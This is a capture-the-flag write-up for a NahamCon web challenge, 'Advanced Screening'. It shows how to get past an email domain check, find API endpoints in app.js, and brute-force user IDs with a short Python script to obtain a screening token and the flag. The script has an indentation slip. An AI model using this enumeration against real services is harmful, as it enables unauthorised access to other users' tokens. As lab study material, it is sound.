# Advanced Screening
On the first page of this, we are prompted to enter an email. Entering any mail returns a "Failed to send email" error. Inspecting the request the app is making to `/api/email/` shows the error:
```json
error:'Only email addresses from "movieservice.ctf are allowed"
```
Change the email you are using to anything with the domain `@movieservice.ctf`.  Once you do this, you will be prompted to enter a six digit code. The logic behind this can be seen if we inspect the page & view `app.js` (app.txt). In here, we can see that the API is validating our code via the `/validate/` endpoint. The other endpoint we can see is `/screen-token`. If we try to hit this endpoint, we get `Missing user id` initially, if we manually post a user ID, we get `User not found`. We can enumerate this to try to get a token with:
```python
import requests

for digit in range(1,50):
	url = "http://challenge.nahamcon.com:30166/api/screen-token/"
	payload = {
		"user_id": digit
	}
	response = requests.post(url, json=payload)

	if "User not found" in response.text:
		continue
	else:
	print(f"found id {digit}")
	print(response.text)
	continue
```
Some results will come back with `Account deactivated`, but you should get at least one token returned. Looking back at `app.js`, we can see that it is validating our token data at `/screen/?key=${tokenData.hash}`. Manually navigating to the URL `http://challenge.nahamcon.com:[PORT]/screen/?key=[YOUR TOKEN]` gets the flag.
